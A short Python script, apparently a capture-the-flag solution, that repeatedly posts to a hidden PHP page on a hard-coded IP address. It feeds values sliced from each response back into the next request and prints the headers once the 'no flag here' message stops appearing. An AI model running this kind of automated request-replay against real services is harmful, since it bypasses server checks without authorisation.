import requests
from bs4 import BeautifulSoup

data = {
    'c': 'x',
    's': 'x'
}

k=0

while True:
    r = requests.post('http://104.199.235.135:31332/_hidden_flag_.php', data=data)
    soup = BeautifulSoup(r.text, "html5lib")
    k += 1
    data['c'] = r.text[196:196+len(str(k))]
    data['s'] = r.text[237+len(str(k)):301+len(str(k))]
    h = str(r.headers)
    if "Hmm ... no flag here!" not in r.text:
        print(h[123:])
        break
